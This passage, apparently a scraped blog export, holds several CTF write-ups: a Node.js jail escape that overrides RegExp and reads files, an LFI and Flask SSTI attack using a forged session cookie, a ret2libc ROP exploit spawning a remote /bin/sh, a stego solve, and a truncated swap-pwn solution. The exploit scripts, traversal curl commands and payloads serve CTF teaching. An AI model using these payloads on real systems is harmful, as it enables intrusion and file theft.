the function we can see the hangup function is being set into process.exit. We have an interesting feature too if we try to call 911 we will jump into ask function: 1234567891011121314151617_____________________________ || || || || || ||, , ,|| || || (||/|/(/||/ || || ||| _'_´||| || || || o o || || || (|| - ´||) || || || = || || || ||\\___/|| || ||___||) , (||___|| /||---||-\\_/-||---||\\ / ||--_||_____||_--|| \\ (_(||)-|S555-4202|-(||)_)|\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"|| \"You get one call, UNO.\" | \"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" Phone #&gt; ask 12345function ask()&#123; rl.question(template,function(answer)&#123; Jail.call(answer); &#125;);&#125; As we can see the function ask is restarting the program this will come handy later, we have some restriction too RegexExp class is blocking ‘.’, ‘[‘, ‘]’ and ‘\\‘ characters: 12345if(new RegExp(/[\\[\\]\\.\\\\]/).test(number))&#123; console.log(\"Dangerous characters detected\"); hangup(); return;&#125; So how do can we bypass this? my plan was: 12341 - Override RegexExp class to always return true.2 - Recall function call but this time with 911 number(this will restart the program and a this point RegexExp returns always false so we can inject any character we want).3 - Get the current filename.4 - Use process.mainModule.require(&apos;fs&apos;).readFileSync(filename) to read the file and get the flag! Override RegexExpTo override the RegexExp class we can just do this: 1hangup = function a() &#123; RegExp = class Dog extends RegExp &#123; test() &#123;return false;&#125;&#125;; call(911);&#125; 123456789101112131415161718192021222324252627282930313233343536_____________________________ || || || || || ||, , ,|| || || (||/|/(/||/ || || ||| _'_´||| || || || o o || || || (|| - ´||) || || || = || || || ||\\___/|| || ||___||) , (||___|| /||---||-\\_/-||---||\\ / ||--_||_____||_--|| \\ (_(||)-|S555-4202|-(||)_)|\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"|| \"You get one call, UNO.\" | \"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" Phone #&gt; hangup = function a() &#123; RegExp = class Dog extends RegExp &#123; test() &#123;return false;&#125;&#125;; call(911);&#125;Calling function a() &#123; RegExp = class Dog extends RegExp &#123; test() &#123;return false;&#125;&#125;; call(911);&#125;... Nobody picks up!Invalid number_____________________________ || || || || || ||, , ,|| || || (||/|/(/||/ || || ||| _'_´||| || || || o o || || || (|| - ´||) || || || = || || || ||\\___/|| || ||___||) , (||___|| /||---||-\\_/-||---||\\ / ||--_||_____||_--|| \\ (_(||)-|S555-4202|-(||)_)|\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"|| \"You get one call, UNO.\" | \"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" Phone #&gt; Getting the filenameAt this point we can inject any characters we want because the test function will always return false! so lets get the filename: 12345678910111213141516171819202122232425262728293031323334353637_____________________________ || || || || || ||, , ,|| || || (||/|/(/||/ || || ||| _&apos;_´||| || || || o o || || || (|| - ´||) || || || = || || || ||\\___/|| || ||___||) , (||___|| /||---||-\\_/-||---||\\ / ||--_||_____||_--|| \\ (_(||)-|S555-4202|-(||)_)|&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;|| &quot;You get one call, UNO.&quot; | &quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot; Phone #&gt; hangup = function a() &#123; RegExp = class Dog extends RegExp &#123; test() &#123;return false;&#125;&#125;; call(911);&#125;Calling function a() &#123; RegExp = class Dog extends RegExp &#123; test() &#123;return false;&#125;&#125;; call(911);&#125;... Nobody picks up!Invalid number_____________________________ || || || || || ||, , ,|| || || (||/|/(/||/ || || ||| _&apos;_´||| || || || o o || || || (|| - ´||) || || || = || || || ||\\___/|| || ||___||) , (||___|| /||---||-\\_/-||---||\\ / ||--_||_____||_--|| \\ (_(||)-|S555-4202|-(||)_)|&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;|| &quot;You get one call, UNO.&quot; | &quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot; Phone #&gt; __filenameCalling /app/jail.js... Nobody picks up! We have the full path! the javascript file is located in /app/jail.js Read the javascript fileFinally by injecting this after the override process.mainModule.require(‘fs’).readFileSync(‘/app/jail.js’).toString() 123456789101112131415161718192021222324252627282930313233343536373839_____________________________ || || || || || ||, , ,|| || || (||/|/(/||/ || || ||| _'_´||| || || || o o || || || (|| - ´||) || || || = || || || ||\\___/|| || ||___||) , (||___|| /||---||-\\_/-||---||\\ / ||--_||_____||_--|| \\ (_(||)-|S555-4202|-(||)_)|\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"|| \"You get one call, UNO.\" | \"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" Phone #&gt; hangup = function a() &#123; RegExp = class Dog extends RegExp &#123; test() &#123;return false;&#125;&#125;; call(911);&#125;Calling function a() &#123; RegExp = class Dog extends RegExp &#123; test() &#123;return false;&#125;&#125;; call(911);&#125;... Nobody picks up!Invalid number_____________________________ || || || || || ||, , ,|| || || (||/|/(/||/ || || ||| _'_´||| || || || o o || || || (|| - ´||) || || || = || || || ||\\___/|| || ||___||) , (||___|| /||---||-\\_/-||---||\\ / ||--_||_____||_--|| \\ (_(||)-|S555-4202|-(||)_)|\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"|| \"You get one call, UNO.\" | \"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" Phone #&gt; process.mainModule.require('fs').readFileSync('/app/jail.js').toString()Calling var flag = \"SECT&#123;1ts_1n_th4T_pl4Ce_Wh3re_1_Pu7_tH4t_Th1ng_th4T_t1m3,&#125;\"var readline = require('readline');var rl = readline.createInterface(process.stdin, process.stdout); Finally our flag is SECT{1ts_1n_th4T_pl4Ce_Wh3re_1_Pu7_tH4t_Th1ng_th4T_t1m3,}","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"},{"name":"Sandbox","slug":"Pwn/Sandbox","permalink":"https://teamrocketist.github.io/categories/Pwn/Sandbox/"},{"name":"Javascript","slug":"Pwn/Sandbox/Javascript","permalink":"https://teamrocketist.github.io/categories/Pwn/Sandbox/Javascript/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://teamrocketist.github.io/tags/pwn/"},{"name":"sandbox","slug":"sandbox","permalink":"https://teamrocketist.github.io/tags/sandbox/"},{"name":"jailescape","slug":"jailescape","permalink":"https://teamrocketist.github.io/tags/jailescape/"},{"name":"javascript","slug":"javascript","permalink":"https://teamrocketist.github.io/tags/javascript/"},{"name":"nodejs","slug":"nodejs","permalink":"https://teamrocketist.github.io/tags/nodejs/"}]},{"title":"[Pwn] ASIS - Mary Morton","slug":"Pwn-ASIS-Mary-Morton","date":"2017-09-13T11:25:06.000Z","updated":"2018-11-06T04:34:47.037Z","comments":true,"path":"2017/09/13/Pwn-ASIS-Mary-Morton/","link":"","permalink":"https://teamrocketist.github.io/2017/09/13/Pwn-ASIS-Mary-Morton/","excerpt":"","text":"Mary MortonAverage: 4Rating Count: 20Top 3 Solver 217 DangRanKeYi AlonePoints43Solves142CategoryPwnableDescription: Mary surprises Sherlock with her knowledge and insight into his character, but she had a very obvious vulnerability which Sherlock exploited it, although it was very painful for him! Starting by checking the binary security with checksec: 123$ checksec -f ./mary_mortonRELRO STACK CANARY NX PIE RPATH RUNPATH FORTIFY Fortified Fortifiable FILEPartial RELRO Canary found NX enabled No PIE No RPATH No RUNPATH Yes 0 2 ./mary_morton We have stack canary protection and non executable stack, if we analyse the binary with radare2 we can see it’s protected with a password, we can obtain this using radare2: The password","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"}],"tags":[{"name":"stackcanary","slug":"stackcanary","permalink":"https://teamrocketist.github.io/tags/stackcanary/"},{"name":"rop","slug":"rop","permalink":"https://teamrocketist.github.io/tags/rop/"},{"name":"stackoverflow","slug":"stackoverflow","permalink":"https://teamrocketist.github.io/tags/stackoverflow/"},{"name":"formatstring","slug":"formatstring","permalink":"https://teamrocketist.github.io/tags/formatstring/"}]},{"title":"[Web] ASIS - Golem is stupid!","slug":"Web-ASIS-Golem-is-stupid","date":"2017-09-11T04:08:19.000Z","updated":"2018-10-24T23:21:04.846Z","comments":true,"path":"2017/09/11/Web-ASIS-Golem-is-stupid/","link":"","permalink":"https://teamrocketist.github.io/2017/09/11/Web-ASIS-Golem-is-stupid/","excerpt":"","text":"Average: 4.57Rating Count: 28You Rated: Not ratedTop 3 Solver NYUSEC 0daysober TokyoWesternsPoints41Solves151CategoryWebDescription: Golem is an animated anthropomorphic being that is magically created entirely from inanimate matter, but Golem is stupid! Note that the server was down after the CTF ended I can’t show some pictures of the CTF as I would like.We could easily find a LFI on https://golem.asisctf.com/article?name= : 1curl 'https://golem.asisctf.com/article?name=../../../etc/passwd' We could include the /etc/passwd file, we noticed the website was running on Ngnix so we tried some valid paths paths for the configuration files like this: 1curl 'https://golem.asisctf.com/article?name=../../../etc/nginx/sites-available/golem' And we got this The important part of this config file is here! the path to the python configuration server files: After some trial and error we included the server.py with: 1curl 'https://golem.asisctf.com/article?name=../../../opt/serverPython/golem/server.py' The file is: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182#!/usr/bin/pythonimport os from flask import ( Flask, render_template, request, url_for, redirect, session, render_template_string)from flask.ext.session import Session app = Flask(__name__) execfile('flag.py')execfile('key.py') FLAG = flagapp.secret_key = key @app.route(\"/golem\", methods=[\"GET\", \"POST\"])def golem(): if request.method != \"POST\": return redirect(url_for(\"index\")) golem = request.form.get(\"golem\") or None if golem is not None: golem = golem.replace(\".\", \"\").replace(\"_\", \"\").replace(\"&#123;\",\"\").replace(\"&#125;\",\"\") if \"golem\" not in session or session['golem'] is None: session['golem'] = golem template = None if session['golem'] is not None: template = '''&#123;%% extends \"layout.html\" %%&#125; &#123;%% block body %%&#125; &lt;h1&gt;Golem Name&lt;/h1&gt; &lt;div class=\"row&gt; &lt;div class=\"col-md-6 col-md-offset-3 center\"&gt; Hello : %s, why you don't look at our &lt;a href='/article?name=article'&gt;article&lt;/a&gt;? &lt;/div&gt; &lt;/div&gt; &#123;%% endblock %%&#125; ''' % session['golem'] print session['golem'] = None return render_template_string(template) @app.route(\"/\", methods=[\"GET\"])def index(): return render_template(\"main.html\") @app.route('/article', methods=['GET'])def article(): error = 0 if 'name' in request.args: page = request.args.get('name') else: page = 'article' if page.find('flag')&gt;=0: page = 'notallowed.txt' try: template = open('/home/golem/articles/&#123;&#125;'.format(page)).read() except Exception as e: template = e return render_template('article.html', template=template) if __name__ == \"__main__\": app.run(host='0.0.0.0', debug=False) Now the real problem is the flag is in flag.py file but the word flag is filtered: 12if page.find('flag')&gt;=0: page = 'notallowed.txt' We can include the key.py which contains a key, this key according to flask documentation is used to generate session cookies, the included key was 7h15_5h0uld_b3_r34lly_53cur3d.If we analyse the golem function we can see its filtering the {, }, . and _ characters so we can’t template inject code here, well actually if we look closely, if we provide a session cookie “golem” it doesn’t apply this filter but first we need to encrypt the cookie,this is easy because we have the key!We found a python code online that does this after some small modifications we ended up with this: 12345678910111213141516171819202122232425262728293031323334353637#!/usr/bin/env pythonfrom flask.sessions import SecureCookieSessionInterfacefrom itsdangerous import URLSafeTimedSerializerimport sysclass SimpleSecureCookieSessionInterface(SecureCookieSessionInterface): # Override method # Take secret_key instead of an instance of a Flask app def get_signing_serializer(self, secret_key): if not secret_key: return None signer_kwargs = dict( key_derivation=self.key_derivation, digest_method=self.digest_method ) return URLSafeTimedSerializer(secret_key, salt=self.salt, serializer=self.serializer, signer_kwargs=signer_kwargs)def decodeFlaskCookie(secret_key, cookieValue): sscsi = SimpleSecureCookieSessionInterface() signingSerializer = sscsi.get_signing_serializer(secret_key) return signingSerializer.loads(cookieValue)# Keep in mind that flask uses unicode strings for the# dictionary keysdef encodeFlaskCookie(secret_key, cookieDict): sscsi = SimpleSecureCookieSessionInterface() signingSerializer = sscsi.get_signing_serializer(secret_key) return signingSerializer.dumps(cookieDict)if __name__=='__main__': sk = '7h15_5h0uld_b3_r34lly_53cur3d' sessionDict = &#123;u'golem':sys.argv[1]&#125; cookie = encodeFlaskCookie(sk, sessionDict) decodedDict = decodeFlaskCookie(sk, cookie) print cookie We tried to read the flag.py via template python code but we failed hard, after that I stopped and decided to read about some global variables on flask documentation(http://flask.pocoo.org/docs/0.12/templating/), and we found a config global variable we included and the flag was in the dictionary attribute ‘flag’: 12345$ python manageFlaskSession.py \"&#123;&#123; config &#125;&#125;\"eyJnb2xlbSI6eyIgYiI6ImUzc2dZMjl1Wm1sbklIMTkifX0.DJeaSw.hiqTyJ7xj6WCZEX87xbKa48Bjkc$ curl 'https://golem.asisctf.com/golem' -H 'Cookie: session=eyJnb2xlbSI6eyIgYiI6ImUzc2dZMjl1Wm1sbklIMTkifX0.DJeaSw.hiqTyJ7xj6WCZEX87xbKa48Bjkc' --data ''&#123;--omited--,'flag':'ASIS&#123;I_l0v3_SerV3r_S1d3_T3mplate_1nj3ct1on!!&#125;',--omited--&#125;","categories":[{"name":"Web","slug":"Web","permalink":"https://teamrocketist.github.io/categories/Web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://teamrocketist.github.io/tags/web/"},{"name":"flask","slug":"flask","permalink":"https://teamrocketist.github.io/tags/flask/"},{"name":"pythonserver","slug":"pythonserver","permalink":"https://teamrocketist.github.io/tags/pythonserver/"},{"name":"ssti","slug":"ssti","permalink":"https://teamrocketist.github.io/tags/ssti/"},{"name":"lfi","slug":"lfi","permalink":"https://teamrocketist.github.io/tags/lfi/"},{"name":"sessionkey","slug":"sessionkey","permalink":"https://teamrocketist.github.io/tags/sessionkey/"},{"name":"cookies","slug":"cookies","permalink":"https://teamrocketist.github.io/tags/cookies/"}]},{"title":"[Pwn] ASIS - Mrs. Hudson","slug":"Pwn-ASIS-Mrs-Hudson","date":"2017-09-10T20:01:59.000Z","updated":"2018-11-06T04:08:40.191Z","comments":true,"path":"2017/09/10/Pwn-ASIS-Mrs-Hudson/","link":"","permalink":"https://teamrocketist.github.io/2017/09/10/Pwn-ASIS-Mrs-Hudson/","excerpt":"","text":"Average: 2.94Rating Count: 17Top 3 Solver dodododo RPISEC TokyoWesternsPoints54Solves103CategoryPwnableDescription: England would fall if Mrs. Hudson leaves Baker Street. Mrs. Hudson is the first one who is totally exploited by Sherlock, or Does She? nc 178.62.249.106 8642 nc 146.185.168.172 8642 Lets start by checking the security of the binary (https://github.com/slimm609/checksec.sh): 123$ checksec -f ./mrs._hudsonRELRO STACK CANARY NX PIE RPATH RUNPATH FORTIFY Fortified Fortifiable FILEPartial RELRO No canary found NX disabled No PIE No RPATH No RUNPATH No 0 0 ./mrs._hudson We don’t have any kind of protections so analysing it with radare2 The binary is pretty simple we have a scanf in the end, with it we can overflow the buffer…My plan was: 123451 - overflow the buffer and leak puts address.2 - search in the libc-database for a libc.so.3 - calculate system address and binsh address.4 - jump to main again.5 - overflow the buffer and jump to system(&apos;/bin/sh&apos;). Calculate the offset to RIPWe can use metasploit(to create the patterns) and gdb but first lets see the address of the ret instruction in assembly: 123| 0x00400680 e89bfeffff call sym.imp.__isoc99_scanf ; int scanf(const char *format)| 0x00400685 c9 leave\\ 0x00400686 c3 ret And now generate the patterns and use gdb to calculate the offset 12345678910111213$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag$ gdb ./mrs._hudsonpwndbg&gt; b *0x00400686pwndbg&gt; rLet's go back to 2000.Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9pwndbg&gt; x $rsp0x7fffffffde08: 0x6541316541306541$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x6541316541306541[*] Exact match at offset 120 The offset is 120. Leak puts addressWe have to leak the libc address from puts, we can do this by using puts_plt and puts_got addresses with return oriented programming, keep in mind that in x86 parameters are stored on the stack, but in x64 the first six parameters are saved in RDI, RSI, RDX, RCX, R8 and R9, if there are more parameters will be saved on the stack. So if we want to build the Rop chain to call puts we should first POP RDI RET so we save the next value in the stack to RDI. To find the POP RDI; RET gadget we can use ROPgadgets: 123456789101112131415$ ROPgadget --binary ./mrs._hudson --only \"pop|ret\"Gadgets information============================================================0x00000000004006ec : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004006ee : pop r13 ; pop r14 ; pop r15 ; ret0x00000000004006f0 : pop r14 ; pop r15 ; ret0x00000000004006f2 : pop r15 ; ret0x00000000004006eb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004006ef : pop rbp ; pop r14 ; pop r15 ; ret0x0000000000400575 : pop rbp ; ret0x00000000004006f3 : pop rdi ; ret0x00000000004006f1 : pop rsi ; pop r15 ; ret0x00000000004006ed : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004004ee : ret0x00000000004005a5 : ret 0xc148 Now start building our exploit to leak puts libc address: 1234567891011121314151617181920212223from pwn import *binary = ELF('./mrs._hudson')local = TruePOPRET = 0x00000000004006f3PUTSPLT = binary.plt['puts']PUTSGOT = binary.got['puts']padding = 'A' * 120ropchain = ''ropchain += p64(POPRET) # POP RDI; RETropchain += p64(PUTSGOT) # PUTS ADDRESS ARG[1]ropchain += p64(PUTSPLT) # PUTS function \"call\"r = process('./mrs._hudson') if local else remote('178.62.249.106', 8642)r.recvline()r.sendline(padding + ropchain)PUTS = u64(r.recv(0x6).ljust(8, '\\x00'))log.info(\"PUTS 0x%x\" % PUTS) Search libc-databaseWe can user this libc-database and try to find a lib to corresponds to our puts leaked address: 1234567891011121314$ python mrs._hudson.py[*] &apos;~/ctf/asis/pwn/mrs._hudson&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments[+] Opening connection to 178.62.249.106 on port 8642: Done[*] Puts 0x7fc73fd10690$ ./find puts 0x7fc73fd10690 #libc-database folderubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu9_amd64)~/ctf/tokyo/pwn/swap/libc.so.6 (id local-14c22be9aa11316f89909e4237314e009da38883) It was funny because it was the same libc.so of a challenge I did previously in tokyo westerns. Calculate libcbase and other addressesNow that we have the lib.so.6 we can now use extract from it the offsets using pwntools: 1234567891011121314151617181920212223242526272829binary = ELF('./mrs._hudson')libc = ELF('libc.so.6') # got libc from libc-databaselocal = FalsePOPRET = 0x00000000004006f3PUTSPLT = binary.plt['puts']PUTSGOT = binary.got['puts']padding = 'A' * 120ropchain = ''ropchain += p64(POPRET) # POP RDI; RETropchain += p64(PUTSGOT) # PUTS ADDRESS ARG[1]ropchain += p64(PUTSPLT) # PUTS function \"call\"ropchain += p64(MAIN) # MAIN function \"call\"r = process('./mrs._hudson', env = &#123;\"LD_PRELOAD\":\"./libc.so.6\"&#125;) if local else remote('178.62.249.106', 8642)r.recvline()r.sendline(padding + ropchain)PUTS = u64(r.recv(0x6).ljust(8, '\\x00'))LIBCBASE = PUTS - libc.symbols['puts']SYSTEM = LIBCBASE + libc.symbols['system']BINSH = LIBCBASE + 0x18cd17log.info(\"LIBC 0x%x\" % LIBCBASE)log.info(\"LIBC 0x%x\" % PUTS)log.info(\"SYSTEM 0x%x\" % SYSTEM)log.info(\"Binsh 0x%x\" % (BINSH)) Return to main and jump to system(‘/bin/sh’)First lets get the main address from radare2: 12345678 ;-- main:/ (fcn) sym.main 109| sym.main ();| ; var int local_80h @ rbp-0x80| ; var int local_74h @ rbp-0x74| ; var int local_70h @ rbp-0x70| ; DATA XREF from 0x0040054d (entry0)| 0x0040061a 55 push rbp We add MAIN to our rop chain, after we execute puts, we jump to main again: 123456MAIN = 0x000000000040061Aropchain = ''ropchain += p64(POPRET) # POP RDI; RETropchain += p64(PUTSGOT) # PUTS ADDRESS ARG[1]ropchain += p64(PUTSPLT) # PUTS function \"call\"ropchain += p64(MAIN) # MAIN function \"call\" And now the final exploit: 1234567891011121314151617181920212223242526272829303132333435363738394041424344from pwn import *import struct import timedef getConn(): return process('./mrs._hudson', env = &#123;\"LD_PRELOAD\":\"./libc.so.6\"&#125;) if local else remote('178.62.249.106', 8642)binary = ELF('./mrs._hudson')libc = ELF('libc.so.6') # got libc from libc-databaselocal = FalsePOPRET = 0x00000000004006f3PUTSPLT = binary.plt['puts']PUTSGOT = binary.got['puts']MAIN = 0x000000000040061Apadding = 'A' * 120ropchain = ''ropchain += p64(POPRET) # POP RDI; RETropchain += p64(PUTSGOT) # PUTS ADDRESS ARG[1]ropchain += p64(PUTSPLT) # PUTS function \"call\"ropchain += p64(MAIN) # MAIN function \"call\"r = getConn()r.recvline()r.sendline(padding + ropchain)PUTS = u64(r.recv(0x6).ljust(8, '\\x00'))LIBCBASE = PUTS - libc.symbols['puts']SYSTEM = LIBCBASE + libc.symbols['system']BINSH = LIBCBASE + 0x18cd17log.info(\"LIBC 0x%x\" % LIBCBASE)log.info(\"PUTS 0x%x\" % PUTS)log.info(\"SYSTEM 0x%x\" % SYSTEM)log.info(\"Binsh 0x%x\" % (BINSH))r.recvline()r.recvline()r.sendline(padding + p64(POPRET) + p64(BINSH) + p64(SYSTEM))r.interactive()r.close() Run and get the flag: 123456789101112131415161718192021222324252627$ python mrs._hudson.py[*] '~/ctf/asis/pwn/mrs._hudson' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments[*] '~/ctf/asis/pwn/libc.so.6' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled[+] Opening connection to 178.62.249.106 on port 8642: Done[*] LIBC 0x7ff6d2ec0000[*] PUTS 0x7ff6d2f2f690[*] SYSTEM 0x7ff6d2f05390[*] Binsh 0x7ff6d304cd17[*] Switching to interactive mode$ ls homefrontofficemanager$ ls home/frontofficemanagerflaghudson_3ab429dd29d62964e5596e6afe0d17d9$ cat home/frontofficemanager/flagASIS&#123;W3_Do0o_N0o0t_Like_M4N4G3RS_OR_D0_w3?&#125;","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"},{"name":"x64","slug":"Pwn/x64","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/"},{"name":"Stack Issue","slug":"Pwn/x64/Stack-Issue","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Stack-Issue/"},{"name":"Stack Overflow","slug":"Pwn/x64/Stack-Issue/Stack-Overflow","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Stack-Issue/Stack-Overflow/"}],"tags":[{"name":"rop","slug":"rop","permalink":"https://teamrocketist.github.io/tags/rop/"},{"name":"stack_overflow","slug":"stack-overflow","permalink":"https://teamrocketist.github.io/tags/stack-overflow/"},{"name":"pwn","slug":"pwn","permalink":"https://teamrocketist.github.io/tags/pwn/"},{"name":"ret2libc","slug":"ret2libc","permalink":"https://teamrocketist.github.io/tags/ret2libc/"},{"name":"asis2017","slug":"asis2017","permalink":"https://teamrocketist.github.io/tags/asis2017/"}]},{"title":"[Stego] ASIS - ASIS secret letter","slug":"Stego-ASIS-ASIS-secret-letter","date":"2017-09-10T18:10:59.000Z","updated":"2018-10-24T23:21:04.842Z","comments":true,"path":"2017/09/10/Stego-ASIS-ASIS-secret-letter/","link":"","permalink":"https://teamrocketist.github.io/2017/09/10/Stego-ASIS-ASIS-secret-letter/","excerpt":"","text":"ASIS secret letterAverage: 4.17Rating Count: 6You Rated: 5Top 3 Solver Teamrocketist dcua CodiSecPoints202Solves17CategoryMisc StegoDescription: The face is the index of the mind, its ASIS secret letter! We have two images lets use binwalk on the jpg image: 1234567$ binwalk a.jpg DECIMAL HEXADECIMAL DESCRIPTION--------------------------------------------------------------------------------0 0x0 JPEG image data, JFIF standard 1.0130 0x1E TIFF image data, big-endian, offset of first image directory: 856 0x38 Zlib compressed data, default compression Doesn’t look like it has something special so lets extract the files using binwalk again but with the parameter e: 123456$ binwalk -e a.jpgDECIMAL HEXADECIMAL DESCRIPTION--------------------------------------------------------------------------------0 0x0 JPEG image data, JFIF standard 1.0130 0x1E TIFF image data, big-endian, offset of first image directory: 856 0x38 Zlib compressed data, default compression Binwalk will create a folder with extracted files: 12$ ls_a.jpg.extracted/38 38.zlib Checking the 38 file we can see we have a double encoded base64 string: 12$ cat 38 | base64 -d | base64 -d💌 from ASIS with love, please find secret message and reply soon, powered by 👉 Stéganô 👈⏎ Stéganô is a python package for steganography which can be found here https://github.com/cedricbonhomme/Stegano Now using stegano to extract something from png, there was two binaries in stegano we tried with stegano-lsb but it didn’t work so we tried with stegano-lsb-set with the generator triangular_numbers: 12$ Stegano/bin/stegano-lsb-set reveal -i e07d17ed7d8104590ff3e17bdf052057.png -g triangular_numbersASIS&#123;767ba85340d9e49fa0bb9c2b12037f08&#125; And we got the flag!","categories":[{"name":"Stego","slug":"Stego","permalink":"https://teamrocketist.github.io/categories/Stego/"}],"tags":[{"name":"forensics","slug":"forensics","permalink":"https://teamrocketist.github.io/tags/forensics/"},{"name":"binwalk","slug":"binwalk","permalink":"https://teamrocketist.github.io/tags/binwalk/"},{"name":"stego","slug":"stego","permalink":"https://teamrocketist.github.io/tags/stego/"},{"name":"stegano","slug":"stegano","permalink":"https://teamrocketist.github.io/tags/stegano/"}]},{"title":"[Pwn] Tokyo Westerns CTF 3rd 2017 - Swap","slug":"Pwn-Tokyo-Westerns-CTF-3rd-2017-Swap","date":"2017-09-07T02:47:20.000Z","updated":"2018-10-24T23:21:04.842Z","comments":true,"path":"2017/09/07/Pwn-Tokyo-Westerns-CTF-3rd-2017-Swap/","link":"","permalink":"https://teamrocketist.github.io/2017/09/07/Pwn-Tokyo-Westerns-CTF-3rd-2017-Swap/","excerpt":"","text":"The swapping is interesting. Let’s try!nc pwn1.chal.ctf.westerns.tokyo 19937swaplibc.so.6 We are given an 64 bit ELF for Linux x86-64: 12$ file swapswap: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=74448e9fb5920898de1f9b5115c764eff1c8edac, not stripped We decompile it using ida’s pseudo c converter: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123; int v3; // eax@2 void *src; // [sp+20h] [bp-20h]@0 void *v5; // [sp+28h] [bp-18h]@0 char dest; // [sp+30h] [bp-10h]@7 initialize(); while ( 1 ) &#123; while ( 1 ) &#123; print_menu(); v3 = read_int(); if ( v3 != 1 ) break; puts(\"Please input 1st addr\"); src = (void *)read_ll(); puts(\"Please input 2nd addr\"); v5 = (void *)read_ll(); &#125; if ( v3 == 2 ) &#123; memcpy(&amp;dest, src, 8uLL); memcpy(src, v5, 8uLL); memcpy(v5, &amp;dest, 8uLL); &#125; else if ( !v3 ) &#123; puts(\"Bye.\"); exit(0); &#125; &#125;&#125;__int64 read_int()&#123; __int64 result; // rax@1 char buf; // [sp+10h] [bp-90h]@1 read(0, &amp;buf, 0x10uLL); result = atoi(&amp;buf); return result;&#125;__int64 read_ll()&#123; __int64 result; // rax@1 char buf; // [sp+10h] [bp-110h]@1 read(0, &amp;buf, 0x20uLL); result = atoll(&amp;buf); return result;&#125; Resuming what the program is actually doing: 123Option 1 - Choose two addressesOption 2 - Swap 2 addresses previously chosen (can be used to switch function addresses for example)Option 3 - Prints bye and exits The first thing we can start doing is to get the GOT(Global Offset Table) addresses of the functions we need, we can do this in 3 ways:objdump 1$ objdump -R swap readelf 1$ readelf -r swap pwntools 12345binary = ELF ( './swap' )ATOIGOT = binary.got['atoi']PUTSGOT = binary.got['puts']READGOT = binary.got['read']MEMCOPYGOT = binary.got['memcpy'] To get the PLT addresses we can either use objdump or pwntools againobjdump 1objdump -dj.plt swap pwntools 12binary = ELF ( './swap' )PUTSPLT = binary.plt['puts'] Now making a nice function to swap addresses in python : 12345678910def swap(address1, address2): print r.recvuntil('Your choice: \\n') send('1') print r.recvuntil('Please input 1st addr') send(str(address1)) print 